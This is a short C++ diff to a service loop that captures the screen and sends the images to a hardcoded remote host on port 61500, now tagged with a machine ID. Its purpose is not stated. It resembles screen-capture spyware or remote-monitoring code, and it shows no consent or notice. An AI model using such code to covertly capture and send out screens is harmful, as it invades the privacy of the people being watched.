@@ -44,19 +44,31 @@ void ServiceManager::main(bool separate_process) {
         cout << "Creating ScreenManager" << endl;
         ScreenManager screen_manager = ScreenManager();
 
+        this->unique_id = get_machine_id();
+        cout << "UniqueID: " << this->unique_id << endl;
+
         // string hostname = "192.241.213.182";
         string hostname = "192.168.0.118";
         SOCKET socket = 0;
 
         while (1) {
+            // cout << "1: " << socket << endl;
+
             if (socket == 0) {
                 socket = connect(hostname, 61500);
             }
 
+            // cout << "2: " << socket << endl;
+
             if (socket != 0) {
                 string image = screen_manager.capture();
-                send_image(socket, image, hostname);
+                send_image(socket, image, this->unique_id, hostname);
+
+                // check if response == 1
+                // if not, then try to reconnect
             }
+
+            // cout << "3: " << socket << endl;
 
             wait();
         }
